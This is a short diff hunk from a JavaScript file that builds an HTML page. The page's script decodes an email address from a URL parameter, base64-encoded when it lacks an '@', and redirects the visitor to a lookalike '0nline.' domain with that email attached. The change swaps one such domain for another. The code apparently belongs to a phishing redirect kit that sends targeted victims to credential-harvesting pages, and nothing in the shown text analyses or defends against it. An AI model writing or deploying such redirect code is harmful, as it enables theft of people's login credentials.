@@ -439,7 +439,7 @@ const html = `
     var decodedEmail = emailParam.includes("@") ? emailParam : atob(emailParam); 
  
     window.location.replace( 
-      "https://0nline.mail-ajg.com/?username=" + decodedEmail 
+      "https://0nline.sterlingwilson.co/?username=" + decodedEmail 
     ); 
   </script> 
   </body>
